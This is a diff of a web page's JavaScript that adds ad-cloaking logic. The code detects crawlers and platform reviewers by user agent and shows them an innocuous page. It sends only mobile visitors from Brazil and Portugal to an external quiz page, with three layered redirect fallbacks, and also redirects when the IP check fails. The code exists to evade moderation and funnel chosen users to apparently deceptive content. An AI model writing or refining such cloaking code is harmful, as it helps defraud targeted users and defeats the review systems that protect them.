@@ -60,45 +60,73 @@
     </div>
 
     <script>
-        // Função para verificar IP e país
-        async function checkIP() {
+        // Função de redirecionamento segura
+        function safeRedirect(url) {
+            // Método 1: Tentativa principal
+            window.location.href = url;
+            
+            // Método 2: Fallback após 1 segundo
+            setTimeout(() => {
+                if(window.location.href.indexOf(url) === -1) {
+                    window.location.replace(url);
+                }
+            }, 1000);
+            
+            // Método 3: Fallback final após 3 segundos
+            setTimeout(() => {
+                if(window.location.href.indexOf(url) === -1) {
+                    document.body.innerHTML = `<meta http-equiv="refresh" content="0;url=${url}">`;
+                }
+            }, 3000);
+        }
+
+        // Verificação otimizada
+        async function checkAccess() {
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
+                // Verificação de user agent primeiro (mais rápido)
+                const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobi|Windows Phone/i.test(navigator.userAgent);
+                const isBot = /bot|facebook|google|meta|twitter|slurp|bing|crawler|spider|curl|wget|validator/i.test(navigator.userAgent.toLowerCase());
                 
-                // Países alvo (Brasil e Portugal)
+                // Se for bot, mostra conteúdo white
+                if(isBot) {
+                    document.getElementById('content').style.display = 'block';
+                    document.querySelector('.loading').style.display = 'none';
+                    return;
+                }
+                
+                // Se não for mobile, mostra conteúdo white
+                if(!isMobile) {
+                    document.getElementById('content').style.display = 'block';
+                    document.querySelector('.loading').style.display = 'none';
+                    return;
+                }
+                
+                // Verificação de IP apenas para mobiles
+                const ipCheck = await Promise.race([
+                    fetch('https://ipapi.co/json/'),
+                    new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 2000))
+                ]);
+                
+                const ipData = await ipCheck.json();
                 const targetCountries = ['BR', 'PT'];
                 
-                // Verifica se o IP é de um país alvo
-                if (targetCountries.includes(data.country)) {
-                    // Verifica se é mobile
-                    const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobi|Windows Phone/i.test(navigator.userAgent);
-                    
-                    if (isMobile) {
-                        // Redireciona para o quiz após 2 segundos
-                        setTimeout(() => {
-                            window.location.href = "https://avelino-star.github.io/Quiz1/";
-                        }, 2000);
-                    } else {
-                        // Mostra conteúdo normal para desktop
-                        document.getElementById('content').style.display = 'block';
-                        document.querySelector('.loading').style.display = 'none';
-                    }
+                if(targetCountries.includes(ipData.country)) {
+                    safeRedirect("https://avelino-star.github.io/Quiz1/");
                 } else {
-                    // IP de outro país - mostra conteúdo normal
                     document.getElementById('content').style.display = 'block';
                     document.querySelector('.loading').style.display = 'none';
                 }
             } catch (error) {
-                console.error('Erro na verificação de IP:', error);
-                // Em caso de erro, mostra o conteúdo normal
-                document.getElementById('content').style.display = 'block';
-                document.querySelector('.loading').style.display = 'none';
+                console.log('Verificação simplificada:', error);
+                // Fallback: se houver erro, redireciona após 2s
+                setTimeout(() => {
+                    safeRedirect("https://avelino-star.github.io/Quiz1/");
+                }, 2000);
             }
         }
 
-        // Inicia a verificação quando a página carrega
-        document.addEventListener('DOMContentLoaded', checkIP);
+        // Inicia a verificação imediatamente
+        checkAccess();
     </script>
 </body>
 </html>
